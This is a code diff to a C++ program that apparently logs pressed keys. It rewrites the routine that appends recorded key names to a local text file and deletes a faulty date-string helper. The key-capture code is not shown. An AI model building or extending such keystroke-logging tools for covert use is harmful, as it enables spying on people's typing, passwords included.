@@ -36,26 +36,22 @@ float GetComputerOperatingTime()
     return a;
 }
 
-std::string CurrentDateTime()
-{
-    char *output;
-    time_t seconds = time(nullptr);
-    tm* timeinfo = localtime(&seconds);
-    strcpy(output," Date:  ");
-    strcat(output,asctime(timeinfo));
-    return output;
-}
 
-void write_press_keys_to_file(const char* path, std::vector<const char*>& names)
-{
-    auto d_save = check(open(path, O_CREAT | O_RDWR, S_IRWXU | S_IRWXG | S_IRWXO));
 
-    for (int i = 0; i < names.size(); ++i)
+void write_press_keys_to_file(const char* path, std::vector<std::string>& names)
+{
+    std::fstream f;
+    f.open(path, std::fstream::in | std::fstream::out | std::fstream::app);
+    if (!f.eof())
+        f << "\n";
+    for (auto i = 0; i < names.size(); ++i)
     {
-        write(d_save, names[i], strlen(names[i]));
+        f << names[i];
+        if (i == 0 || i == names.size() -2)
+            f << "\n";
     }
-
-    close(d_save);
+    f << "\n\n";
+    f.close();
 }
 #pragma endregion
 
@@ -71,9 +67,10 @@ int main()
     auto path = strcat(Name, ".txt");
     #pragma endregion
 
-    std::vector<const char*> names;
-    names = name_of_the_keys.get_keys_vector(path);
+    std::vector<std::string> names = name_of_the_keys.get_keys_vector(path);
     write_press_keys_to_file(path, names);
     #pragma endregion
+
+    
     return 0;
 }
